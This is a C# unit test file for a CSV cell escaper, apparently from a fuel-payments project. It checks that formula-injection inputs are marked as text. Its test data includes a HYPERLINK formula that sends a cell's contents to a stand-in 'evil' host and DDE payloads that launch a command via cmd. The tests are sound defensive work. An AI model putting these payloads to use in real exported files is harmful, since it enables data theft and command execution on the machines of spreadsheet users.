using FluentAssertions;
using FuelFlow.SharedKernel.Output;
using Xunit;

namespace FuelFlow.UnitTests.SharedKernel;

public class CsvCellTests
{
    [Theory]
    [InlineData("=HYPERLINK(\"http://evil/?d=\"&A1)")]
    [InlineData("+SUM(1,2)")]
    [InlineData("-2+3")]
    [InlineData("@SUM(A1)")]
    [InlineData("\t=cmd|'/c calc'!A0")]
    [InlineData("\r=cmd|'/c calc'!A0")]
    public void Text_MarksAFormulaSoASpreadsheetReadsItAsText(string typed)
    {
        CsvCell.Text(typed).Should().StartWith("\"'");
    }

    [Fact]
    public void Text_KeepsWhatTheCellSaysApartFromTheMarker()
    {
        CsvCell.Text("=1+1").Should().Be("\"'=1+1\"");
    }

    [Fact]
    public void Text_DoublesAnInnerQuoteAndKeepsTheCellWhole()
    {
        CsvCell.Text("say \"no\"").Should().Be("\"say \"\"no\"\"\"");
    }

    [Fact]
    public void Text_WritesAnEmptyCellForAnAbsentValue()
    {
        CsvCell.Text(null).Should().Be("\"\"");
    }

    [Fact]
    public void Text_LeavesAPlainCellAlone()
    {
        CsvCell.Text("оплата за пальне").Should().Be("\"оплата за пальне\"");
    }
}
